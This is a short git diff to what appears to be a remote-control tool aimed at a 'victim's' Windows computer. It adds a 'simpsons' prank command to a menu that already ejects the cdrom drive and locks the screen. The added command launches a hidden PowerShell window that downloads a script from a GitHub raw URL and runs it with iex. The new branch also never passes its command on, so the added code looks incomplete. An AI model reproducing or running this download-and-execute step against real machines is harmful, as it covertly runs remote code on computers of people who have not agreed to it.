@@ -139,6 +139,7 @@ while not stop:
             print("ducky/cdromloop      N/A          Prank the victim with a continuously ejecting cdrom drive")
             print("ducky/quackimage     N/A          Prank the victim by opening a \"you just got quacked\" image")
             print("ducky/lock           N/A          Lock the victim's computer")
+            print("ducky/simpsons       N/A          Prank the victim with Bart Simpson's lock message")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -268,6 +269,9 @@ while not stop:
             commands = []
             commands.append("rundll32.exe user32.dll, LockWorkStation")
             stdin = "; ".join(commands)
+        elif ducky_command[:8] == "simpsons":
+            commands = []
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/simpsons).content\'")
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
